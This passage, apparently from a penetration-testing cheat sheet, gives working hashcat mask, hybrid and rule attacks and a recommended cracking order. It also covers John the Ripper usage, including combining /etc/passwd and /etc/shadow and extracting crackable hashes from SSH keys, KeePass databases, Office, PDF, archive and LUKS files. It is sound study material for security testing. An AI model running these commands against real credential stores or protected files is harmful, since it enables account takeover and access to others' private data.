?b = all bytes  0x00-0xff # 8 chars lowercase + digits
hashcat -m 1000 -a 3 hashes.txt '?l?l?l?l?l?d?d?d'

# capitalised word pattern: upper first, 5 lower, 2 digits, 1 special
hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?d?d?s'

# all possible 4-digit pins
hashcat -m 1000 -a 3 hashes.txt '?d?d?d?d'

# increment: try lengths 1 through 8
hashcat -m 1000 -a 3 --increment --increment-min 1 --increment-max 8 hashes.txt '?l?l?l?l?l?l?l?l'

# custom charset: only common special chars
hashcat -m 1000 -a 3 -1 '!@#$' hashes.txt '?u?l?l?l?l?d?d?1' **mask with known prefix/suffix:** # password starts with "summer" followed by 4 digits and optional special
hashcat -m 1000 -a 3 hashes.txt 'summer?d?d?d?d?s'

# company name prefix (known) + 4 digits
hashcat -m 1000 -a 3 hashes.txt 'acme?d?d?d?d' attack mode 6 — hybrid (wordlist + mask) appends a mask to each word in a wordlist: # each wordlist entry + 2 digits
hashcat -m 1000 -a 6 hashes.txt rockyou.txt '?d?d'

# each wordlist entry + 1 digit + 1 special
hashcat -m 1000 -a 6 hashes.txt rockyou.txt '?d?s'

# wordlist + 4 digits (captures password1234 style)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt '?d?d?d?d' attack mode 7 — hybrid (mask + wordlist) prepends a mask to each word: # 2 digits + wordlist entry
hashcat -m 1000 -a 7 hashes.txt '?d?d' rockyou.txt

# common: year prefix
hashcat -m 1000 -a 7 hashes.txt '20?d?d' rockyou.txt
# tries: 2020password, 2021password, 2022secret... hashcat rules rules are the most powerful hashcat feature. they transform candidate passwords at runtime — no need to pre-generate mutated wordlists. built-in rule files ls /usr/share/hashcat/rules/
# best64.rule         — 64 common mutations, excellent first pass
# rockyou-30000.rule  — 30000 rules extracted from rockyou cracking stats
# dive.rule           — large, thorough
# d3ad0ne.rule        — heavy-duty, slow
# incisive-leetspeak.rule  — leet substitutions
# toggles1.rule       — case toggling
# unix-ninja-leetspeak.rule rule syntax writing custom rules # create a rule file
cat > custom.rule << 'eof'
# capitalise + append numbers 1-99 (common corporate pattern)
c $1
c $2
c $3
c $1 $2
c $2 $3
c $1 $2 $3
c $! 
c $@ 
c $# 
c $1 $2 $3 $!
# leet speak
se3 sa@ so0 si1
c se3
c sa@ so0
eof

hashcat -m 1000 hashes.txt rockyou.txt -r custom.rule best-practice cracking order order of passes by crack rate vs time: 1. dictionary alone (rockyou, no rules)          — fastest, catches weak passwords
2. dictionary + best64.rule                      — catches 80% of crackable hashes
3. dictionary + rockyou-30000.rule               — slow but thorough
4. hybrid mode 6 (wordlist + ?d?d)              — catches append-digit patterns
5. hybrid mode 6 (wordlist + ?d?d?d?d)          — year appends
6. mask: ?u?l?l?l?l?l?d?d?s (common 9-char)    — pure brute for common patterns
7. custom wordlist + rules (target-specific)     — company/context passwords
8. mask full brute ≤ 8 chars (long overnight)   — last resort john the ripper john the ripper (jtr) is the swiss army knife of password cracking. while hashcat dominates gpu cracking, john excels at:
- automatically identifying hash types
- cracking file-based passwords (zip, ssh keys, keepass, office)
- cpu-based cracking with excellent built-in rules
- working with unconventional or obscure formats installation # kali — usually pre-installed
john --version

# jumbo version (supports far more formats)
apt install john

# from source (most complete)
git clone https://github.com/openwall/john
cd john/src && ./configure && make -s clean && make -sj4
# binary: john/run/john basic usage # auto-detect format and crack with default wordlist
john hashes.txt

# specify wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# specify format
john --format=nt hashes.txt
john --format=sha512crypt hashes.txt

# apply rules
john --wordlist=rockyou.txt --rules hashes.txt
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# show cracked
john --show hashes.txt
john --show --format=nt hashes.txt

# list all supported formats
john --list=formats
john --list=formats | grep -i ntlm john format names (important ones) nt                  # windows ntlm
netntlmv2           # netntlmv2 (responder captures)
krb5tgs             # kerberoasting
krb5asrep           # as-rep roasting
sha512crypt         # linux $6$
sha256crypt         # linux $5$
md5crypt            # linux $1$
bcrypt              # $2a$, $2b$
apache              # .htpasswd md5
mysql-sha1          # mysql 4.1+
raw-md5             # plain md5
raw-sha1            # plain sha1
raw-sha256          # plain sha256 john's cracking modes **single crack** — uses variations of the username/login field: john --single hashes.txt
# great for passwords like: admin:admin1, john:john123 **wordlist mode** — standard dictionary attack: john --wordlist=rockyou.txt hashes.txt **wordlist + rules:** john --wordlist=rockyou.txt --rules hashes.txt           # default rules
john --wordlist=rockyou.txt --rules=jumbo hashes.txt     # extended rules
john --wordlist=rockyou.txt --rules=korelogic hashes.txt # complex corporate rules **incremental (brute force):** john --incremental hashes.txt             # all characters
john --incremental=digits hashes.txt      # digits only
john --incremental=alpha hashes.txt       # alpha only
john --incremental=alnum hashes.txt       # alphanumeric john's session management # named session (save/restore)
john --session=mysession --wordlist=rockyou.txt hashes.txt

# resume a session
john --restore=mysession

# check status of running john
john --status=mysession unshadow — prepare linux /etc/shadow for john # combine /etc/passwd and /etc/shadow into john format
unshadow /etc/passwd /etc/shadow > shadow_combined.txt
john shadow_combined.txt
john shadow_combined.txt --wordlist=rockyou.txt --rules file-based cracking with john john's strongest unique feature is cracking password-protected files. the `*2john` utilities extract a crackable hash from the file. ssh private keys ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt
john id_rsa.hash --wordlist=rockyou.txt --rules zip files zip2john secret.zip > zip.hash
john zip.hash --wordlist=rockyou.txt

# or with hashcat (mode 17200/17210/17220)
zip2john secret.zip | grep -op '\$pkzip.*' > zip_hc.hash
hashcat -m 17200 zip_hc.hash rockyou.txt rar archives rar2john secret.rar > rar.hash
john rar.hash --wordlist=rockyou.txt

# rar3: hashcat -m 12500
# rar5: hashcat -m 13000 keepass databases keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=rockyou.txt

# hashcat mode 13400
hashcat -m 13400 keepass.hash rockyou.txt microsoft office files office2john document.docx > office.hash
office2john spreadsheet.xlsx >> office.hash
john office.hash --wordlist=rockyou.txt

# hashcat modes:
# office 2013: -m 9600
# office 2010: -m 9500
# office 2007: -m 9400
# office 97-2003: -m 9700 / 9800
hashcat -m 9600 office.hash rockyou.txt pdf files pdf2john document.pdf > pdf.hash
john pdf.hash --wordlist=rockyou.txt

# hashcat mode 10500 (pdf 1.4-1.6) or 10600/10700
hashcat -m 10500 pdf.hash rockyou.txt 7-zip archives 7z2john archive.7z > 7z.hash
john 7z.hash --wordlist=rockyou.txt

# hashcat mode 11600
hashcat -m 11600 7z.hash rockyou.txt luks disk encryption luks2john /dev/sdb > luks.hash
john luks.hash --wordlist=rockyou.txt full list of *2john utilities ls /usr/share/john/*2john*
# or
